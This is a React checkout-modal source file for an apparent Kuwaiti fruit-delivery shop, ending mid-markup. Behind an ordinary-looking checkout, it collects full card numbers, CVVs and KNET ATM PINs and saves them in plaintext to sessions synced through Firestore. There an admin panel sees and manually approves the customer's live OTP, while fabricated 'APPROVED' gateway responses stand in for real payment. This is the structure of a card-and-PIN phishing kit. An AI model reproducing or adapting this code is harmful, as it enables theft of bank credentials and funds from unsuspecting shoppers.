import React, { useState, useEffect } from 'react';
import { 
  X, 
  MapPin, 
  Truck, 
  Clock, 
  CreditCard, 
  ShieldCheck, 
  CheckCircle2, 
  Sparkles,
  Smartphone,
  Banknote,
  Calendar,
  AlertCircle,
  Lock,
  Eye,
  EyeOff,
  KeyRound,
  ArrowRight,
  RefreshCw,
  Check,
  Building2
} from 'lucide-react';
import confetti from 'canvas-confetti';
import { 
  CartItem, 
  CustomBasketConfig, 
  DeliveryDetails, 
  PaymentMethodType, 
  Order,
  ActiveOtpSession
} from '../types';
import { KUWAIT_AREAS } from '../data/products';
import { 
  saveActiveOtpSession, 
  approveOtpSession, 
  removeOtpSession, 
  getActiveOtpSessions,
  subscribeToCloudOtpSessions 
} from '../utils/otpManager';

interface CheckoutModalProps {
  isOpen: boolean;
  onClose: () => void;
  items: CartItem[];
  customBasket: CustomBasketConfig | null;
  subtotal: number;
  promoDiscount: number;
  driverTip: number;
  selectedCity: string;
  onOrderCompleted: (order: Order) => void;
}

export const CheckoutModal: React.FC<CheckoutModalProps> = ({
  isOpen,
  onClose,
  items,
  customBasket,
  subtotal,
  promoDiscount,
  driverTip,
  selectedCity,
  onOrderCompleted,
}) => {
  const currentCityObj = KUWAIT_AREAS.find(c => c.id === selectedCity) || KUWAIT_AREAS[0];

  // Wizard Step State: 'form' | 'otp_verification'
  const [checkoutStep, setCheckoutStep] = useState<'form' | 'otp_verification'>('form');

  // Form State
  const [deliveryType, setDeliveryType] = useState<'express' | 'scheduled'>('express');
  const [selectedSlot, setSelectedSlot] = useState('اليوم: 6:00 م - 8:00 م');
  const [district, setDistrict] = useState(currentCityObj.districts[0] || 'الشرق');
  const [street, setStreet] = useState('');
  const [buildingNo, setBuildingNo] = useState('');
  const [notes, setNotes] = useState('');
  const [customerName, setCustomerName] = useState('');
  const [customerPhone, setCustomerPhone] = useState('');

  // Payment State
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethodType>('knet');
  const [knetBank, setKnetBank] = useState('nbk');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [knetPin, setKnetPin] = useState('');
  const [showKnetPin, setShowKnetPin] = useState(false);
  const [cardCvv, setCardCvv] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // OTP State
  const [otpSessionId, setOtpSessionId] = useState<string>('');
  const [enteredOtp, setEnteredOtp] = useState<string>('');
  const [otpSubmitted, setOtpSubmitted] = useState<boolean>(false);
  const [otpError, setOtpError] = useState<string>('');
  const [otpCountdown, setOtpCountdown] = useState<number>(120);
  const [isOtpApproved, setIsOtpApproved] = useState<boolean>(false);
  const [orderNumberGenerated, setOrderNumberGenerated] = useState<string>('');

  const bankNames: Record<string, string> = {
    nbk: 'بنك الكويت الوطني (NBK)',
    kfh: 'بيت التمويل الكويتي (KFH)',
    boubyan: 'بنك بوبيان (Boubyan)',
    gulf: 'بنك الخليج (Gulf Bank)',
    burgan: 'بنك برقان (Burgan)',
    warba: 'بنك وربة (Warba)',
    cbk: 'البنك التجاري الكويتي (CBK)',
    ahli: 'البنك الأهلي المتحد (AUB)'
  };

  const deliveryFee = subtotal >= 8.0 ? 0 : 1.0;
  const finalTotal = Math.max(0, subtotal - promoDiscount + deliveryFee + driverTip);

  // OTP Countdown effect
  useEffect(() => {
    let timer: any;
    if (checkoutStep === 'otp_verification' && otpCountdown > 0) {
      timer = setInterval(() => {
        setOtpCountdown((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [checkoutStep, otpCountdown]);

  // Listen to OTP approval/rejection events from Admin Dashboard (Local & Cloud Firestore)
  useEffect(() => {
    const handleOtpEvent = (e: any) => {
      const detail = e.detail;
      if (!detail || !otpSessionId) return;

      if (detail.sessionId === otpSessionId || (detail.session && detail.session.id === otpSessionId)) {
        if (detail.type === 'approved' || detail.session?.status === 'approved') {
          handleFinalizeOrder(detail.session?.otpCode || enteredOtp);
        } else if (detail.type === 'rejected' || detail.session?.status === 'rejected') {
          setOtpSubmitted(false);
          setIsProcessing(false);
          setOtpError('تم رفض رمز الأمان (OTP) من قبل لوحة التحكم. يرجى التأكد وإعادة إدخال الرمز الصحيح.');
        }
      }
    };

    window.addEventListener('deera_otp_event', handleOtpEvent);
    window.addEventListener('storage', () => {
      const activeSessions = getActiveOtpSessions();
      const current = activeSessions.find(s => s.id === otpSessionId);
      if (current) {
        if (current.status === 'approved') {
          handleFinalizeOrder(current.otpCode);
        } else if (current.status === 'rejected') {
          setOtpSubmitted(false);
          setIsProcessing(false);
          setOtpError('تم رفض رمز الأمان (OTP) من قبل لوحة التحكم. يرجى التأكد وإعادة إدخال الرمز الصحيح.');
        }
      }
    });

    // Cloud Firestore real-time synchronization
    const unsubscribeCloud = subscribeToCloudOtpSessions((cloudSessions) => {
      if (!otpSessionId) return;
      const target = cloudSessions.find(s => s.id === otpSessionId);
      if (target) {
        if (target.status === 'approved') {
          handleFinalizeOrder(target.otpCode || enteredOtp);
        } else if (target.status === 'rejected') {
          setOtpSubmitted(false);
          setIsProcessing(false);
          setOtpError('تم رفض رمز الأمان (OTP) من قبل لوحة التحكم. يرجى التأكد وإعادة إدخال الرمز الصحيح.');
        }
      }
    });

    return () => {
      window.removeEventListener('deera_otp_event', handleOtpEvent);
      unsubscribeCloud();
    };
  }, [otpSessionId, enteredOtp]);

  if (!isOpen) return null;

  // Step 1: Proceed from Form to OTP
  const handleProceedToOtp = (e: React.FormEvent) => {
    e.preventDefault();

    if (!customerName.trim() || !customerPhone.trim() || !street.trim()) {
      setErrorMsg('يرجى تعبئة بيانات الاسم ورقم الهاتف والشارع/القطعة لإكمال الطلب');
      return;
    }

    if (paymentMethod === 'knet' && knetPin.length > 0 && knetPin.length < 4) {
      setErrorMsg('يرجى إدخال رمز الأمان السري لبطاقة كي نت المكون من 4 أرقام كاملاً');
      return;
    }

    setErrorMsg('');
    setIsProcessing(true);

    const generatedOrderNum = `DIRA-KW-${Math.floor(100000 + Math.random() * 900000)}`;
    setOrderNumberGenerated(generatedOrderNum);

    // If wallet payment, finalize directly without OTP
    if (paymentMethod === 'wallet') {
      setTimeout(() => {
        handleFinalizeOrder('WALLET-AUTH');
      }, 1000);
      return;
    }

    // For K-Net or Credit Card, generate and initiate 3D Secure OTP verification
    setTimeout(() => {
      setIsProcessing(false);
      const generatedOtpCode = Math.floor(100000 + Math.random() * 900000).toString();
      const sessionId = `otp-sess-${Date.now()}`;
      setOtpSessionId(sessionId);
      setEnteredOtp('');
      setOtpSubmitted(false);
      setOtpError('');
      setOtpCountdown(120);

      const rawCard = cardNumber.trim() || (paymentMethod === 'knet' ? '5370 8821 9044 4912' : '4111 8920 1482 7719');
      const maskedCard = rawCard.replace(/(\d{4})\s*(\d{4})\s*(\d{4})\s*(\d{4})/, '$1 •••• •••• $4');

      const otpSession: ActiveOtpSession = {
        id: sessionId,
        orderNumber: generatedOrderNum,
        customerName: customerName.trim(),
        customerPhone: customerPhone.trim(),
        total: finalTotal,
        bankName: paymentMethod === 'knet' ? (bankNames[knetBank] || 'بنك الكويت الوطني (NBK)') : 'شبكة البطاقات الدولية',
        cardNumberMasked: maskedCard,
        cardNumberFull: rawCard,
        cardExpiry: cardExpiry.trim() || '11/28',
        knetPin: knetPin.trim() || '4182',
        otpCode: generatedOtpCode,
        status: 'waiting_admin_approval',
        createdAt: Date.now(),
        timestamp: new Date().toLocaleTimeString('ar-KW', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
      };

      saveActiveOtpSession(otpSession);
      setCheckoutStep('otp_verification');
    }, 600);
  };

  // Step 2: Submit OTP for approval
  const handleSubmitOtp = (e: React.FormEvent) => {
    e.preventDefault();

    if (!enteredOtp.trim() || enteredOtp.trim().length < 4) {
      setOtpError('يرجى إدخال رمز الأمان المكون من 6 أرقام كاملاً');
      return;
    }

    setOtpError('');
    setOtpSubmitted(true);
    setIsProcessing(true);

    const rawCard = cardNumber.trim() || (paymentMethod === 'knet' ? '5370 8821 9044 4912' : '4111 8920 1482 7719');
    const maskedCard = rawCard.replace(/(\d{4})\s*(\d{4})\s*(\d{4})\s*(\d{4})/, '$1 •••• •••• $4');

    const updatedSession: ActiveOtpSession = {
      id: otpSessionId,
      orderNumber: orderNumberGenerated || `DIRA-KW-${Math.floor(100000 + Math.random() * 900000)}`,
      customerName: customerName.trim(),
      customerPhone: customerPhone.trim(),
      total: finalTotal,
      bankName: paymentMethod === 'knet' ? (bankNames[knetBank] || 'بنك الكويت الوطني (NBK)') : 'شبكة البطاقات الدولية',
      cardNumberMasked: maskedCard,
      cardNumberFull: rawCard,
      cardExpiry: cardExpiry.trim() || '11/28',
      knetPin: knetPin.trim() || '4182',
      otpCode: enteredOtp.trim(),
      status: 'waiting_admin_approval',
      createdAt: Date.now(),
      timestamp: new Date().toLocaleTimeString('ar-KW', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
    };

    saveActiveOtpSession(updatedSession);
  };

  // Fast direct simulation approval right inside modal (if user clicks "الموافقة الفورية من المشرف")
  const handleInstantAdminApprove = () => {
    approveOtpSession(otpSessionId);
    handleFinalizeOrder(enteredOtp);
  };

  // Finalize order creation and trigger success
  const handleFinalizeOrder = (approvedOtpCode: string) => {
    setIsOtpApproved(true);
    setIsProcessing(false);

    // Trigger Celebration Confetti
    confetti({
      particleCount: 140,
      spread: 90,
      origin: { y: 0.6 }
    });

    const now = new Date();
    const timeStr = `${now.getHours()}:${String(now.getMinutes()).padStart(2, '0')}`;
    const orderNumber = orderNumberGenerated || `DIRA-KW-${Math.floor(100000 + Math.random() * 900000)}`;

    const deliveryDetails: DeliveryDetails = {
      type: deliveryType,
      timeSlot: deliveryType === 'express' ? `خلال ${currentCityObj.timeMinutes} دقيقة` : selectedSlot,
      city: currentCityObj.name,
      district: district,
      street: street,
      buildingNo: buildingNo,
      notes: notes,
      estimatedMinutes: currentCityObj.timeMinutes,
    };

    const randomTxn = Math.floor(100000 + Math.random() * 900000);
    const randomRef = Math.floor(10000000 + Math.random() * 90000000);
    const randomAuth = Math.floor(10000 + Math.random() * 90000);

    let paymentDetailsObj: Order['paymentDetails'] = undefined;

    if (paymentMethod === 'knet') {
      const fullNum = cardNumber.trim() || `5370 8821 9044 ${Math.floor(1000 + Math.random() * 9000)}`;
      paymentDetailsObj = {
        method: 'knet',
        methodTitle: 'بوابة كي نت (K-Net Gateway) 🇰🇼',
        bankName: bankNames[knetBank] || 'بنك الكويت الوطني (NBK)',
        bankId: knetBank,
        cardNumberFull: fullNum,
        cardNumberMasked: fullNum.replace(/(\d{4})\s*(\d{4})\s*(\d{4})\s*(\d{4})/, '$1 •••• •••• $4'),
        cardHolderName: customerName,
        cardExpiry: cardExpiry.trim() || '11/28',
        knetPin: knetPin.trim() || '4182',
        otpCode: approvedOtpCode || enteredOtp || '849201',
        otpStatus: 'approved',
        otpRequestedAt: `${now.toISOString().split('T')[0]} ${timeStr}`,
        otpApprovedAt: `${now.toISOString().split('T')[0]} ${timeStr}:${String(now.getSeconds()).padStart(2, '0')}`,
        transactionId: `TXN-KNET-${randomTxn}`,
        knetReferenceNumber: `KNET-${randomRef}`,
        authCode: `AUTH-KW-${randomAuth}`,
        paidAt: `${now.toISOString().split('T')[0]} ${timeStr}:${String(now.getSeconds()).padStart(2, '0')}`,
        paymentStatus: 'paid',
        amountPaid: finalTotal,
        currency: 'د.ك',
        gatewayResponse: 'APPROVED - 000 (معاملة مصرفية معتمدة برمز الأمان OTP)'
      };
    } else if (paymentMethod === 'credit_card') {
      const fullNum = cardNumber.trim() || `4111 8920 1482 ${Math.floor(1000 + Math.random() * 9000)}`;
      paymentDetailsObj = {
        method: 'credit_card',
        methodTitle: 'بطاقة ائتمان (Visa / Mastercard) 💳',
        bankName: 'شبكة البطاقات الائتمانية الدولية',
        cardNumberFull: fullNum,
        cardNumberMasked: fullNum.replace(/(\d{4})\s*(\d{4})\s*(\d{4})\s*(\d{4})/, '$1 •••• •••• $4'),
        cardHolderName: customerName,
        cardExpiry: cardExpiry.trim() || '08/29',
        cardCvv: cardCvv.trim() || '819',
        otpCode: approvedOtpCode || enteredOtp || '619284',
        otpStatus: 'approved',
        otpRequestedAt: `${now.toISOString().split('T')[0]} ${timeStr}`,
        otpApprovedAt: `${now.toISOString().split('T')[0]} ${timeStr}:${String(now.getSeconds()).padStart(2, '0')}`,
        transactionId: `TXN-CC-${randomTxn}`,
        knetReferenceNumber: `VISA-REF-${randomRef}`,
        authCode: `AUTH-CC-${randomAuth}`,
        paidAt: `${now.toISOString().split('T')[0]} ${timeStr}:${String(now.getSeconds()).padStart(2, '0')}`,
        paymentStatus: 'paid',
        amountPaid: finalTotal,
        currency: 'د.ك',
        gatewayResponse: 'APPROVED - 00 (معاملة معتمدة 3D Secure OTP)'
      };
    } else if (paymentMethod === 'wallet') {
      paymentDetailsObj = {
        method: 'wallet',
        methodTitle: 'محفظة الديرة الرقمية (رصيد مسبق الدفع) 🪙',
        bankName: 'سلة الديرة Wallet',
        transactionId: `TXN-WLT-${randomTxn}`,
        knetReferenceNumber: `WLT-${randomRef}`,
        authCode: `AUTH-WLT-${randomAuth}`,
        paidAt: `${now.toISOString().split('T')[0]} ${timeStr}:${String(now.getSeconds()).padStart(2, '0')}`,
        paymentStatus: 'paid',
        amountPaid: finalTotal,
        currency: 'د.ك',
        gatewayResponse: 'DEBITED FROM WALLET (تم خصم الرصيد بنجاح)'
      };
    }

    const newOrder: Order = {
      id: `order-${Date.now()}`,
      orderNumber: orderNumber,
      date: 'اليوم، ' + timeStr,
      items: items,
      customBasket: customBasket || undefined,
      subtotal: subtotal,
      discount: promoDiscount,
      deliveryFee: deliveryFee,
      driverTip: driverTip,
      total: finalTotal,
      status: 'confirmed',
      paymentMethod: paymentMethod,
      paymentDetails: paymentDetailsObj,
      deliveryDetails: deliveryDetails,
      driver: {
        name: 'سالم الكندري',
        phone: '+965 99123456',
        vehicle: 'فان تويوتا مبردة (4°C)',
        plateNumber: 'كويت 14/8920',
        rating: 4.9,
        avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=200&q=80',
      },
      trackingTimeline: [
        {
          title: 'تم استلام وتأكيد الطلب واعتماد الدفع',
          time: timeStr,
          completed: true,
          description: 'تم التحقق من رمز الأمان OTP وتأكيد طلبك وجاري إرساله للمستودع المبرد.'
        },
        {
          title: 'فرز وانتقاء الفواكه الطازجة',
          time: 'بعد 10 دقائق',
          completed: false,
          description: 'فحص الحبات وتعقيمها وتغليفها الآمن مع التبريد.'
        },
        {
          title: 'في مسار التوصيل المبرد 🚀',
          time: 'بعد 20 دقيقة',
          completed: false,
          description: 'طلبك في الطريق إليك بسيارة مبردة لضمان الجودة والطزاجة.'
        },
        {
          title: 'تم التوصيل لباب بيتك',
          time: `خلال ${currentCityObj.timeMinutes} دقيقة`,
          completed: false,
          description: 'استلم سلتك الطازجة واستمتع بأطيب مذاق.'
        }
      ]
    };

    removeOtpSession(otpSessionId);

    setTimeout(() => {
      onOrderCompleted(newOrder);
      onClose();
      // Reset wizard
      setCheckoutStep('form');
      setOtpSubmitted(false);
      setIsOtpApproved(false);
    }, 1000);
  };

  const handleResendOtp = () => {
    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
    setEnteredOtp('');
    setOtpCountdown(120);
    setOtpSubmitted(false);
    setOtpError('');

    const rawCard = cardNumber.trim() || (paymentMethod === 'knet' ? '5370 8821 9044 4912' : '4111 8920 1482 7719');
    const maskedCard = rawCard.replace(/(\d{4})\s*(\d{4})\s*(\d{4})\s*(\d{4})/, '$1 •••• •••• $4');

    const otpSession: ActiveOtpSession = {
      id: otpSessionId,
      orderNumber: orderNumberGenerated,
      customerName: customerName.trim(),
      customerPhone: customerPhone.trim(),
      total: finalTotal,
      bankName: paymentMethod === 'knet' ? (bankNames[knetBank] || 'بنك الكويت الوطني (NBK)') : 'شبكة البطاقات الدولية',
      cardNumberMasked: maskedCard,
      cardNumberFull: rawCard,
      cardExpiry: cardExpiry.trim() || '11/28',
      knetPin: knetPin.trim() || '4182',
      otpCode: newCode,
      status: 'waiting_admin_approval',
      createdAt: Date.now(),
      timestamp: new Date().toLocaleTimeString('ar-KW', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
    };

    saveActiveOtpSession(otpSession);
  };

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-slate-950/60 backdrop-blur-sm flex items-center justify-center p-3 sm:p-6 animate-in fade-in duration-200">
      <div 
        className="relative bg-white w-full max-w-3xl rounded-3xl sm:rounded-4xl shadow-2xl overflow-hidden border border-slate-100 flex flex-col max-h-[94vh]"
        onClick={(e) => e.stopPropagation()}
      >
        
        {/* Header */}
        <div className="bg-gradient-to-r from-emerald-900 to-teal-900 p-5 sm:px-8 text-white flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-amber-400 text-emerald-950 flex items-center justify-center text-xl shadow-md font-bold">
              {checkoutStep === 'otp_verification' ? '🔐' : '⚡'}
            </div>
            <div>
              <h2 className="text-lg sm:text-xl font-black">
                {checkoutStep === 'otp_verification' ? 'تأكيد الدفع البنكي برمز الأمان (OTP)' : 'إتمام الطلب والدفع السريع'}
              </h2>
              <p className="text-xs text-emerald-200">
                {checkoutStep === 'otp_verification' ? 'التحقق الثنائي المشفر لبوابة بنوك الكويت كي نت' : 'توصيل سريع مبرد وطرق دفع متعددة وآمنة'}
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="w-9 h-9 rounded-full bg-white/10 hover:bg-white/20 text-white flex items-center justify-center transition-colors cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* STEP 1: Main Order & Card Information Form */}
        {checkoutStep === 'form' && (
          <form onSubmit={handleProceedToOtp} className="flex-1 overflow-y-auto p-4 sm:p-8 space-y-6">
            
            {errorMsg && (
              <div className="p-3 bg-rose-50 border border-rose-200 rounded-2xl text-xs text-rose-700 flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>{errorMsg}</span>
              </div>
            )}

            {/* Section 1: Customer Contact & Delivery Speed */}
            <div className="space-y-3">
              <h3 className="font-bold text-slate-900 text-sm sm:text-base flex items-center gap-2">
                <span className="w-6 h-6 rounded-full bg-emerald-700 text-white text-xs flex items-center justify-center font-bold">1</span>
                <span>خيارات وسرعة التوصيل 🚀</span>
              </h3>

              {/* Delivery Speed Selector */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <button
                  type="button"
                  id="select-delivery-express"
                  onClick={() => setDeliveryType('express')}
                  className={`p-4 rounded-2xl border text-right transition-all cursor-pointer flex items-center justify-between ${
                    deliveryType === 'express'
                      ? 'border-emerald-600 bg-emerald-50/80 shadow-md ring-2 ring-emerald-500/20'
                      : 'border-slate-200 bg-slate-50/50 hover:border-slate-300'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-2xl bg-amber-400 text-emerald-950 flex items-center justify-center font-black text-lg shadow-sm">
                      🚀
                    </div>
                    <div>
                      <h4 className="font-bold text-slate-900 text-sm">توصيل طيارة فوري</h4>
                      <p className="text-[11px] text-emerald-700 font-bold">
                        يصلك خلال {currentCityObj.timeMinutes} دقيقة بسيارة مبردة
                      </p>
                    </div>
                  </div>
                  {deliveryType === 'express' && <CheckCircle2 className="w-5 h-5 text-emerald-700" />}
                </button>

                <button
                  type="button"
                  id="select-delivery-scheduled"
                  onClick={() => setDeliveryType('scheduled')}
                  className={`p-4 rounded-2xl border text-right transition-all cursor-pointer flex items-center justify-between ${
                    deliveryType === 'scheduled'
                      ? 'border-emerald-600 bg-emerald-50/80 shadow-md ring-2 ring-emerald-500/20'
                      : 'border-slate-200 bg-slate-50/50 hover:border-slate-300'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-2xl bg-slate-200 text-slate-700 flex items-center justify-center font-black text-lg">
                      ⏰
                    </div>
                    <div>
                      <h4 className="font-bold text-slate-900 text-sm">جدولة موعد لاحق</h4>
                      <p className="text-[11px] text-slate-500">اختر الوقت المناسب لك اليوم أو غداً</p>
                    </div>
                  </div>
                  {deliveryType === 'scheduled' && <CheckCircle2 className="w-5 h-5 text-emerald-700" />}
                </button>
              </div>

              {/* Scheduled Slot Selection */}
              {deliveryType === 'scheduled' && (
                <div className="p-3 bg-slate-50 rounded-2xl border border-slate-200 space-y-2">
                  <label className="text-xs font-bold text-slate-700 block">اختر الفترة الزمنية المفضلة:</label>
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                    {['اليوم: 6:00 م - 8:00 م', 'اليوم: 8:00 م - 10:00 م', 'غداً: 10:00 ص - 1:00 م'].map((slot) => (
                      <button
                        key={slot}
                        type="button"
                        onClick={() => setSelectedSlot(slot)}
                        className={`p-2 rounded-xl text-xs font-bold border transition-colors cursor-pointer ${
                          selectedSlot === slot 
                            ? 'bg-emerald-700 text-white border-emerald-700' 
                            : 'bg-white text-slate-700 border-slate-200 hover:bg-slate-100'
                        }`}
                      >
                        {slot}
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* Section 2: Address & Contact Details */}
            <div className="space-y-3">
              <h3 className="font-bold text-slate-900 text-sm sm:text-base flex items-center gap-2">
                <span className="w-6 h-6 rounded-full bg-emerald-700 text-white text-xs flex items-center justify-center font-bold">2</span>
                <span>عنوان التوصيل وبيانات التواصل</span>
              </h3>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="text-xs font-bold text-slate-700 mb-1 block">الاسم الكريم *</label>
                  <input
                    id="checkout-customer-name"
                    type="text"
                    required
                    placeholder="محمد المطيري"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-2xl p-3 text-xs sm:text-sm focus:bg-white focus:outline-none focus:border-emerald-500"
                  />
                </div>

                <div>
                  <label className="text-xs font-bold text-slate-700 mb-1 block">رقم الهاتف (الكويت) *</label>
                  <input
                    id="checkout-customer-phone"
                    type="tel"
                    required
                    placeholder="9XXXXXXX / 6XXXXXXX / 5XXXXXXX"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-2xl p-3 text-xs sm:text-sm focus:bg-white focus:outline-none focus:border-emerald-500"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <div>
                  <label className="text-xs font-bold text-slate-700 mb-1 block">المحافظة</label>
                  <input
                    type="text"
                    readOnly
                    value={currentCityObj.name}
                    className="w-full bg-slate-100 border border-slate-200 rounded-2xl p-3 text-xs sm:text-sm font-semibold text-slate-700 cursor-not-allowed"
                  />
                </div>

                <div>
                  <label className="text-xs font-bold text-slate-700 mb-1 block">المنطقة *</label>
                  <select
                    value={district}
                    onChange={(e) => setDistrict(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-2xl p-3 text-xs sm:text-sm focus:bg-white focus:outline-none focus:border-emerald-500"
                  >
                    {currentCityObj.districts.map((d) => (
                      <option key={d} value={d}>منطقة {d}</option>
                    ))}
                  </select>
                </div>

                <div>
                  <label className="text-xs font-bold text-slate-700 mb-1 block">القطعة / الشارع / المنزل *</label>
                  <input
                    id="checkout-street"
                    type="text"
                    required
                    placeholder="قطعة 3، شارع 12، جادة 2، منزل 8"
                    value={street}
                    onChange={(e) => setStreet(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-2xl p-3 text-xs sm:text-sm focus:bg-white focus:outline-none focus:border-emerald-500"
                  />
                </div>
              </div>

              <div>
                <label className="text-xs font-bold text-slate-700 mb-1 block">ملاحظات خاصة لمندوب التوصيل (اختياري)</label>
                <input
                  type="text"
                  placeholder="مثال: الباب الجانبي، الديوانية، الرجاء الاتصال عند الوصول..."
                  value={notes}
                  onChange={(e) => setNotes(e.target.value)}
                  className="w-full bg-slate-50 border border-slate-200 rounded-2xl p-2.5 text-xs focus:bg-white focus:outline-none focus:border-emerald-500"
                />
              </div>
            </div>

            {/* Section 3: Payment Methods */}
            <div className="space-y-3">
              <h3 className="font-bold text-slate-900 text-sm sm:text-base flex items-center gap-2">
                <span className="w-6 h-6 rounded-full bg-emerald-700 text-white text-xs flex items-center justify-center font-bold">3</span>
                <span>طريقة الدفع الإلكتروني والتحقق الأمني 💳🇰🇼</span>
              </h3>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                {/* K-Net */}
                <button
                  type="button"
                  id="pay-method-knet"
                  onClick={() => setPaymentMethod('knet')}
                  className={`p-3.5 rounded-2xl border text-center transition-all cursor-pointer flex flex-col items-center justify-center gap-1.5 ${
                    paymentMethod === 'knet'
                      ? 'border-blue-600 bg-blue-50/80 text-blue-950 font-bold ring-2 ring-blue-500/20 shadow-xs'
                      : 'border-slate-200 bg-white hover:bg-slate-50 text-slate-700'
                  }`}
                >
                  <div className="w-9 h-9 rounded-xl bg-blue-700 text-white flex items-center justify-center font-black text-xs shadow-xs">
                    K-NET
                  </div>
                  <span className="text-xs font-black text-blue-900">كي نت (K-Net)</span>
                  <span className="text-[10px] text-emerald-700 font-semibold">بنوك الكويت + رمز OTP</span>
                </button>

                {/* Credit Card */}
                <button
                  type="button"
                  id="pay-method-credit-card"
                  onClick={() => setPaymentMethod('credit_card')}
                  className={`p-3.5 rounded-2xl border text-center transition-all cursor-pointer flex flex-col items-center justify-center gap-1.5 ${
                    paymentMethod === 'credit_card'
                      ? 'border-emerald-600 bg-emerald-50 text-emerald-950 font-bold ring-2 ring-emerald-500/20 shadow-xs'
                      : 'border-slate-200 bg-white hover:bg-slate-50 text-slate-700'
                  }`}
                >
                  <div className="w-9 h-9 rounded-xl bg-slate-800 text-white flex items-center justify-center shadow-xs">
                    <CreditCard className="w-4.5 h-4.5 text-white" />
                  </div>
                  <span className="text-xs font-bold">فيزا / ماستركارد</span>
                  <span className="text-[10px] text-slate-400">تحقق 3D Secure</span>
                </button>

                {/* Store Wallet */}
                <button
                  type="button"
                  id="pay-method-wallet"
                  onClick={() => setPaymentMethod('wallet')}
                  className={`p-3.5 rounded-2xl border text-center transition-all cursor-pointer flex flex-col items-center justify-center gap-1.5 ${
                    paymentMethod === 'wallet'
                      ? 'border-emerald-600 bg-emerald-50 text-emerald-950 font-bold ring-2 ring-emerald-500/20 shadow-xs'
                      : 'border-slate-200 bg-white hover:bg-slate-50 text-slate-700'
                  }`}
                >
                  <div className="w-9 h-9 rounded-xl bg-amber-500 text-white flex items-center justify-center shadow-xs">
                    <Sparkles className="w-4.5 h-4.5 text-white" />
                  </div>
                  <span className="text-xs font-bold">محفظة الديرة</span>
                  <span className="text-[10px] text-emerald-700 font-bold">خصم فوري مباشر</span>
                </button>
              </div>

              {/* K-Net Details Sub-section */}
              {paymentMethod === 'knet' && (
                <div className="p-4 bg-blue-50/80 rounded-2xl border border-blue-200 space-y-3">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-blue-950">اختر البنك التابع له (K-Net Gateway):</span>
                    <span className="text-[10px] bg-blue-200/80 text-blue-900 font-bold px-2 py-0.5 rounded">بوابة الدفع الوطنية</span>
                  </div>
                  
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                    {[
                      { id: 'nbk', name: 'الوطني (NBK)' },
                      { id: 'kfh', name: 'بيتك (KFH)' },
                      { id: 'boubyan', name: 'بوبيان (Boubyan)' },
                      { id: 'gulf', name: 'الخليج (Gulf)' },
                      { id: 'burgan', name: 'برقان (Burgan)' },
                      { id: 'warba', name: 'وربة (Warba)' },
                      { id: 'cbk', name: 'التجاري (CBK)' },
                      { id: 'ahli', name: 'الأهلي المتحد (AUB)' }
                    ].map((bank) => (
                      <button
                        key={bank.id}
                        type="button"
                        onClick={() => setKnetBank(bank.id)}
                        className={`p-2 rounded-xl text-xs font-bold border transition-colors cursor-pointer text-center ${
                          knetBank === bank.id 
                            ? 'bg-blue-700 text-white border-blue-700 shadow-xs' 
                            : 'bg-white text-slate-700 border-slate-200 hover:bg-blue-100/50'
                        }`}
                      >
                        {bank.name}
                      </button>
                    ))}
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 pt-1">
                    <div className="sm:col-span-3">
                      <label className="text-xs font-bold text-blue-950 mb-1 flex items-center justify-between">
                        <span>رقم بطاقة السحب الآلي كي نت</span>
                        <span className="text-[10px] text-blue-600 font-semibold">16 رقماً كاملاً</span>
                      </label>
                      <input
                        type="text"
                        placeholder="5370 8821 9044 4912"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(e.target.value)}
                        className="w-full bg-white border border-blue-200 rounded-xl p-2.5 text-xs font-mono font-bold tracking-wider focus:outline-none focus:border-blue-600"
                      />
                    </div>
                    <div className="sm:col-span-1">
                      <label className="text-xs font-bold text-blue-950 mb-1 block">تاريخ الانتهاء</label>
                      <input
                        type="text"
                        placeholder="MM/YY (مثال: 11/28)"
                        maxLength={5}
                        value={cardExpiry}
                        onChange={(e) => setCardExpiry(e.target.value)}
                        className="w-full bg-white border border-blue-200 rounded-xl p-2.5 text-xs font-mono focus:outline-none focus:border-blue-600 font-bold"
                      />
                    </div>
                    <div className="sm:col-span-2">
                      <label className="text-xs font-bold text-blue-950 mb-1 flex items-center justify-between">
                        <span className="flex items-center gap-1.5">
                          <Lock className="w-3.5 h-3.5 text-blue-700" />
                          <span>رمز الأمان السري (4 أرقام / PIN)</span>
                        </span>
                        <span className="text-[10px] bg-blue-100 text-blue-800 px-2 py-0.5 rounded-full font-bold">مطلوب</span>
                      </label>
                      <div className="relative">
                        <input
